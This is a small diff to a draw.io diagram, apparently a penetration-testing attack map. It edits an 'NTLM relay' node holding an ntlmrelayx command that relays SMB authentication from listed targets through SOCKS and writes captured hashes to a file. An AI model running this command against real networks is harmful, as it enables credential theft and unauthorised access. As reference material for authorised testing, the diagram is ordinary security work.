@@ -521,7 +521,7 @@
             <mxGeometry height="60" width="120" x="1141" y="1180" as="geometry" />
           </mxCell>
         </object>
-        <object label="NTLM relay" Relay_SMB_SOCKS="ntlmrelayx -tf smb_targets.txt -of netntlm -smb2support -socks" id="TZx4k0LZ_Z577zQX7S4p-7">
+        <object label="NTLM relay" Relay_SMB_SOCKS="ntlmrelayx -tf smb_targets.txt -of captured_smb_hashes.txt -smb2support -socks" id="TZx4k0LZ_Z577zQX7S4p-7">
           <mxCell parent="1" style="rounded=1;whiteSpace=wrap;html=1;strokeColor=light-dark(#000000, #e5a50a);" vertex="1">
             <mxGeometry height="60" width="120" x="760" y="560" as="geometry" />
           </mxCell>
